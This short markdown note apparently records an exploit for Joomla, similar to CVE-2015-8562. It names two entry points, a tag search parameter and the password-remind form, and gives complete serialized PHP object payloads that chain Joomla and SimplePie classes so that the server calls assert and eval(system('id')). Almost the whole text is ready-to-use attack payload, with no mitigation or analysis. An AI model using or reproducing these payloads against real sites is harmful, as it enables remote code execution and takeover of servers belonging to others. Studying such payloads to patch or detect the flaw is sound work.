# Like CVE-2015-8562

# Entry point: 

- (1) GET */index.php/component/tags/?filter-search=[payload]*
- (2) POST */index.php/component/users/?task=remind.remind*

# Example: 

- (1) */index.php/component/tags/?filter-search=antonydaubuoi|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:45:"eval(system('id'));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}ðýýý*

- (2) *jform%5Bemail%5D=antonydaubuoi|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:45:"eval(system('id'));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}ðýýý&dd4fce6cd3bfdb400f9510a2831ec417=1*
